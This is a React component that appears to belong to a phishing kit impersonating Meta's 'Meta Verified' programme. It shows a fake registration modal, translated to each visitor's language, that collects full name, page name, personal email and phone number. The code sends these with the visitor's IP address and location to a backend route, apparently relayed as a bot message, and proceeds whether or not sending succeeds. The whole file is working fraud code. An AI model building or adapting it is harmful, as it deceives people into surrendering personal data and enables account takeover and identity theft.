import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';

interface FormData {
    fullName: string;
    personalEmail: string;
    pageName: string;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email' | 'textarea';
}

const FORM_FIELDS: FormField[] = [
    { name: 'fullName', label: 'Full Name', type: 'text' },
    { name: 'pageName', label: 'Apply for Meta Verified – [Page Name or URL]', type: 'text' },
    { name: 'personalEmail', label: 'Personal Email', type: 'email' }
];
const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [agreeToTerms, setAgreeToTerms] = useState(false);
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        personalEmail: '',
        pageName: ''
    });

    const { setModalOpen, geoInfo, setMessageId, setMessage } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;
        const textsToTranslate = ['Complete your free Meta Verified registration in just a few steps.', 'Full Name', 'Personal Email', 'Apply for Meta Verified – [Page Name or URL]', 'Mobile phone number', 'Send', 'Our response will be sent to you within 14-40 hours.', 'I agree with Terms of use'];
        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value, type } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;
        setIsLoading(true);

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>\n<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>👤 Full Name:</b> <code>${formData.fullName}</code>
<b>📘 Page Name:</b> <code>${formData.pageName}</code>
<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
<b>📱 Phone Number:</b> <code>${phoneNumber}</code>

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        try {
            const res = await axios.post('/api/send', {
                message
            });
            if (res?.data?.success && typeof res.data.data.result.message_id === 'number') {
                setMessageId(res.data.data.result.message_id);
                setMessage(message);
            }
        } catch {
            // Continue even if send fails
        } finally {
            setIsLoading(false);
            nextStep(formData);
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed top-0 left-0 right-0 bottom-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed top-0 left-0 right-0 bottom-0 z-50 flex min-h-screen items-center justify-center px-1 sm:px-3 md:px-4 overflow-hidden'>
                <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                <div className='mb-2 sm:mb-3 md:mb-4 flex w-full items-center justify-between p-2 sm:p-3 md:p-5'>
                    <p className='text-sm sm:text-base md:text-xl font-bold text-[#1C2B33] flex-1'>{t('Complete your free Meta Verified registration in just a few steps.')}</p>
                    <button type='button' onClick={() => setModalOpen(false)} className='h-8 sm:h-9 w-8 sm:w-9 rounded-full transition-colors hover:bg-[#e2eaf2] flex-shrink-0 ml-2' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faXmark} size='lg' />
                    </button>
                </div>

                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-2 sm:px-3 md:px-4'>
                    <div className='flex flex-col gap-2 sm:gap-2.5 py-2 sm:py-3 md:py-4'>
                        {FORM_FIELDS.map((field) => (
                            <div key={field.name}>
                                <p className='text-sm sm:text-base font-sans text-[#1C2B33] font-semibold'>{t(field.label)}</p>
                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-24 sm:min-h-28 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-2 text-base sm:text-lg' rows={3} /> : <input required name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-11 sm:h-12 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-2 text-base sm:text-lg' />}
                            </div>
                        ))}
                        <p className='text-sm sm:text-base font-sans text-[#1C2B33] font-semibold'>{t('Mobile phone number')}</p>
                        <IntlTelInput
                            onChangeNumber={handlePhoneChange}
                            initOptions={initOptions}
                            inputProps={{
                                name: 'phoneNumber',
                                className: 'h-11 sm:h-12 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-2 text-base sm:text-lg'
                            }}
                        />
                        <p className='text-xs sm:text-sm text-gray-600 mt-3 sm:mt-4'>{t('Our response will be sent to you within 14-40 hours.')}</p>
                        <div className='flex items-center gap-2 mt-3 sm:mt-4'>
                            <input 
                                type='checkbox' 
                                id='agreeTerms'
                                checked={agreeToTerms}
                                onChange={(e) => setAgreeToTerms(e.target.checked)}
                                className='w-4 h-4 cursor-pointer'
                            />
                            <label htmlFor='agreeTerms' className='text-xs sm:text-sm text-gray-700 cursor-pointer'>
                                {t('I agree with Terms of use')}
                            </label>
                        </div>
                        <button type='submit' disabled={isLoading || !agreeToTerms} className={`mt-4 sm:mt-5 md:mt-6 flex h-11 sm:h-12 md:h-14 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-sm sm:text-base md:text-lg text-white transition-colors hover:bg-blue-700 ${isLoading || !agreeToTerms ? 'cursor-not-allowed opacity-60' : ''}`}>
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Send')}
                        </button>
                    </div>
                </form>

                <div className='flex items-center justify-center p-1.5 sm:p-2 md:p-3'>
                    <Image src={MetaLogo} alt='' className='h-3.5 sm:h-4 md:h-4.5 w-14 sm:w-16 md:w-17.5' />
                </div>
            </div>
            </div>
        </>
    );
};

export default InitModal;
